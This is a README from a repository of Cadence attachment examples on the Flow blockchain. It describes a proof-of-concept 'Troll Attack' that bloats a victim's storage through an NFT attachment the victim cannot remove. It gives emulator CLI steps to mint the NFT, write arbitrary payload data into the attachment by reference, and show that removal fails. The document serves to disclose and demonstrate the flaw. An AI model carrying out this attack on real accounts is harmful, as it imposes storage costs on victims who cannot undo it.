## Attachments Example

> Informal repo containing examples with Cadence attachments as the feature

### Troll Attack

This is a proof of concept of an attack vector using attachments to bloat the storage of a base resource with an attachment that cannot be removed. This attack could be made more widespread by enabling the dispersal of these `Troll` resources and enabling anyone on Flow to execute this attack.

#### Replication

1. Deploy the project on emulator
    ```shh
    flow run
    ```

1. Create a victim account
    ```sh
    flow accounts create # account name: victim
    ```

1. Setup the MockTopShot Collection & mint an NFT, first adding an attachment before depositing. This is done for simplicity at time of minting, but you can imagine an attacker could do this with any preconfigured Collection by transfering to a victim's public `Receiver`
    ```sh
    flow transactions send transactions/setup_collection_and_mint_nft_with_attachment.cdc --signer victim
    ```

1. With the attachment added to the NFT which is now in the victim's Collection, the attacker can now add data to the attachment by getting a reference to the NFT and secondarily referecing the attachment. This can be run an arbitrary number of times, and even looped within the transaction given an array of payload strings or with another data type that would allow for programatic iteration.
    ```sh
    flow transactions send transactions/add_data_by_reference.cdc 0x179b6b1cb6755e31 31 "PAYLOAD_STRING"
    ```

1. We can see the data that's been added with the following script.
    ```sh
    flow scripts execute scripts/get_time_bomb_data.cdc 0x179b6b1cb6755e31 31
    ```

1. Finally, we'll try and fail to remove the attachment from the nft
    ```sh
    flow transactions send transactions/remove_and_destroy_time_bomb_fails.cdc 31 --signer victim
    ```